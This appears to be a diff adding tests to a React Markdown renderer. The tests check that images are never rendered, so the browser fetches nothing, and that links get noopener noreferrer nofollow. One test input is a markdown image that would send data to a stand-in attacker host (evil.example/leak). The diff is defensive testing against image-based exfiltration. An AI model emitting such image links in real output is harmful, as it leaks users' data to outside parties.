@@ -12,3 +12,18 @@ test("renders markdown with highlighted, copyable code blocks", () => {
   expect(html).toContain('<span class="hljs-keyword">const</span>');
   expect(html).toContain(">Copy</button>");
 });
+
+test("never renders an image, so the browser fetches nothing", () => {
+  const html = renderToStaticMarkup(
+    <Markdown>{"![secret](https://evil.example/leak?d=abc)"}</Markdown>,
+  );
+  expect(html).not.toContain("<img");
+  expect(html).toContain("secret");
+});
+
+test("marks links as noopener noreferrer nofollow", () => {
+  const html = renderToStaticMarkup(
+    <Markdown>{"[policy](https://example.com/policy)"}</Markdown>,
+  );
+  expect(html).toContain('rel="noopener noreferrer nofollow"');
+});
